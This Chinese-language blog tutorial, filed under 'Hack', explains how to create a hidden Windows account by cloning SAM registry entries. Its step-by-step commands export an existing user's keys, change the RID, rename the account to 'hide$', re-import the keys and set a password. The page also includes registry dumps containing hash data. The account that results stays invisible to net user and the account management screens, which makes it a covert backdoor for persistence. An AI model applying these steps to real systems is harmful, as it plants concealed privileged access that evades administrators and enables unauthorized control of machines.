---
layout: hack
category : Hack
tagline: windows 建立隐藏账户（适用于XP、WIN7等）
tags : [intro, beginner, environment, tutorial]
---
使用注册表操作，可以添加隐藏账户，在`cmd`下，`net user`和`net localgroup administrators`命令看不到。账户界面中也看不到，用户和组中也看不到该用户。只有注册表中可以看到。该方法实际上就是通过注册表来克隆用户。

####基础知识介绍及原理说明

1.`hklm\sam\sam`赋予管理员完全控制权限或者以`system`权限运行命令；

2.`HKEY_LOCAL_MACHINE\sam\sam\domains\account\users\names`中存储的是用户账户，每个账户里面的内容对应其类型，如`0x14f`、`0x3e8`等，即用户`ID`，如：

{% highlight bash %}
HKEY_LOCAL_MACHINE\sam\sam\domains\account\users\names\2008
HKEY_LOCAL_MACHINE\sam\sam\domains\account\users\names\Administrator
HKEY_LOCAL_MACHINE\sam\sam\domains\account\users\names\Guest
HKEY_LOCAL_MACHINE\sam\sam\domains\account\users\names\test
{% endhighlight %}


3.每个账户的类型（即`ID`）对应`HKEY_LOCAL_MACHINE\sam\sam\domains\account\users`下相应的子键，如`0x1f4`对应`HKEY_LOCAL_MACHINE\sam\sam\domains\account\users\000001F4`，`HKEY_LOCAL_MACHINE\sam\sam\domains\account\users`内容示例：
{% highlight bash %}
HKEY_LOCAL_MACHINE\sam\sam\domains\account\users\000001F4
HKEY_LOCAL_MACHINE\sam\sam\domains\account\users\000001F5
HKEY_LOCAL_MACHINE\sam\sam\domains\account\users\000003E8
HKEY_LOCAL_MACHINE\sam\sam\domains\account\users\000003E9
HKEY_LOCAL_MACHINE\sam\sam\domains\account\users\Names
{% endhighlight %}

4.`ID`对应的子键中存储了账户的信息，`F`项存储其权限相关信息，`V`存储了其上次登录时间、修改密码、密码`HASH`等值。内容示例如下：
{% highlight bash %}
HKEY_LOCAL_MACHINE\sam\sam\domains\account\users\000001F4
F    REG_BINARY    02000100000000008ACABCE62E89CB010000000000000000000000000000000000000000000000000000000000000000F401000001020000100000000000000000000600010000000000000031003100
V    REG_BINARY    00000000BC00000002000100BC0000001A00000000000000D80000000000000000000000D80000001A00000000000000F40000000000000000000000F40000000000000000000000F40000000000000000000000F40000000000000000000000F40000000000000000000000F40000000000000000000000F40000000000000000000000F400000015000000A80000000C01000008000000010000001401000004000000000000001801000014000000000000002C0100000400000000000000300100000400000000000000010014809C000000AC0000001400000044000000020030000200000002C014004400050101010000000000010000000002C01400FFFF1F000101000000000005070000000200580003000000000014005B03020001010000000000010000000000001800FF070F000102000000000005200000002002000000002400440002000105000000000005150000008D86E99B38BC9047FE2ACA9DF40100000102000000000005200000002002000001020000000000052000000020020000410064006D0069006E006900730074007200610074006F0072006400A17B0674A18B977B3A672800DF572900847685516E7F105E37627500FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00010001020000070000000300010003000100A3B16F6C86F546A2D693FF6D6A854B2D0300010003000100
{% endhighlight %}

5.`Windows`实际登录时是根据上述表项确定用户是否存在、用户权限、用户信息等的。因此，通过克隆某用户的相关注册表项，即可达到克隆账户目录，从而建立隐藏账户。不过，需要注意的时，克隆出来的用户`ID`不能已经存在，也就是说我们需要修改用户ID。

####操作方法

1.假设我们要克隆`2008`这个用户。先导出该用户的`type`（即`ID`）：
{% highlight bash %}
reg export hklm\sam\sam\domains\account\users\names\2008 hide.reg
{% endhighlight %}

这样，就把`2008`的`type`导出到了`hide.reg`中，其内容为：
{% highlight bash %}
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\sam\sam\domains\account\users\names\2008]
@=hex(3e8):
{% endhighlight %}

2.导出该用户`type`对应的注册表项：
{% highlight bash %}
reg export hklm\sam\sam\domains\account\users\000003e8 hide_type.reg
{% endhighlight %}

这样就把`2008`的用户信息导出到了`hide_type.reg`中，其内容为：
{% highlight bash %}
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\sam\sam\domains\account\users\000003e8]
"F"=hex:02,00,01,00,00,00,00,00,5f,50,d4,48,0c,06,d0,01,00,00,00,00,00,00,00,\
00,82,36,49,6a,61,ea,cf,01,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\    
e8,03,00,00,01,02,00,00,14,00,00,00,56,00,a8,03,00,00,05,00,01,00,00,00,00,\
00,a5,00,00,00,00,00
"V"=hex:00,00,00,00,bc,00,00,00,02,00,01,00,bc,00,00,00,08,00,00,00,00,00,00,\  
00,c4,00,00,00,00,00,00,00,00,00,00,00,c4,00,00,00,00,00,00,00,00,00,00,00,\  
c4,00,00,00,00,00,00,00,00,00,00,00,c4,00,00,00,00,00,00,00,00,00,00,00,c4,\    
00,00,00,00,00,00,00,00,00,00,00,c4,00,00,00,00,00,00,00,00,00,00,00,c4,00,\ 
00,00,00,00,00,00,00,00,00,00,c4,00,00,00,00,00,00,00,00,00,00,00,c4,00,00,\
00,00,00,00,00,00,00,00,00,c4,00,00,00,15,00,00,00,a8,00,00,00,dc,00,00,00,\    
08,00,00,00,01,00,00,00,e4,00,00,00,04,00,00,00,00,00,00,00,e8,00,00,00,14,\
00,00,00,00,00,00,00,fc,00,00,00,04,00,00,00,00,00,00,00,00,01,00,00,04,00,\
00,00,00,00,00,00,01,00,14,80,9c,00,00,00,ac,00,00,00,14,00,00,00,44,00,00,\
00,02,00,30,00,02,00,00,00,02,c0,14,00,44,00,05,01,01,01,00,00,00,00,00,01,\
00,00,00,00,02,c0,14,00,ff,07,0f,00,01,01,00,00,00,00,00,05,07,00,00,00,02,\
00,58,00,03,00,00,00,00,00,24,00,44,00,02,00,01,05,00,00,00,00,00,05,15,00,\
00,00,8d,86,e9,9b,38,bc,90,47,fe,2a,ca,9d,e8,03,00,00,00,00,18,00,ff,07,0f,\
00,01,02,00,00,00,00,00,05,20,00,00,00,20,02,00,00,00,00,14,00,5b,03,02,00,\
01,01,00,00,00,00,00,01,00,00,00,00,01,02,00,00,00,00,00,05,20,00,00,00,20,\
02,00,00,01,02,00,00,00,00,00,05,20,00,00,00,20,02,00,00,32,00,30,00,30,00,\
38,00,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,00,01,\
00,01,02,00,00,07,00,00,00,03,00,01,00,03,00,01,00,09,e1,bc,25,9c,07,0f,57,\
83,45,56,0f,ab,17,44,60,03,00,01,00,03,00,01,00
{% endhighlight %}

3.由于我们是要克隆该用户，需要修改其`type`（避免用户`ID`重复），也就是`hide.reg`中`hex()`里面的内容，并且需要把`hide.reg`中的`2008`改为我们想要的账户名，例如`hide$`,然后将`hide_type.reg`中`HKEY_LOCAL_MACHINE\sam\sam\domains\account\users\000003e8`的`000003e8`改为我们设定的值，也就是修改了的`type`。假设我们改为`0x400`

4.导入 修改过的 `hide.reg` 和 `hide_type.reg` 到注册表中去：
{% highlight bash %}
reg import hide.reg
reg import hide_type.reg
{% endhighlight %}

这样，就克隆了`2008`这个用户了，其用户名为`hide$`,`ID`为`0x400`。由于这里的注册表项存储的`HASH`与`ID`关联，当修改了`ID`之后，用户`HASH`随之改变了，也就是说密码与原用户密码不同。因此，克隆完后，需要修改`hide$`的密码
{% highlight bash %}
net user hide$ P@ssw0rd
{% endhighlight %}

这样，就只有注册表能看到该用户了。

####几点说明

1.对于`2008`服务器而言，登录界面会出现两个`2008`用户，点哪个登录都是登陆的`2008`；

2.如果操作过程中`ID`没有更改或者其他地方失误，可能会导致用户组中存在用户；

3.由于`ID`变了`HASH`也就变了，因此需要修改新用户的密码；

4.用户名需要是尾部为'$'的用户名，如果没有, `net user` 能看到该用户。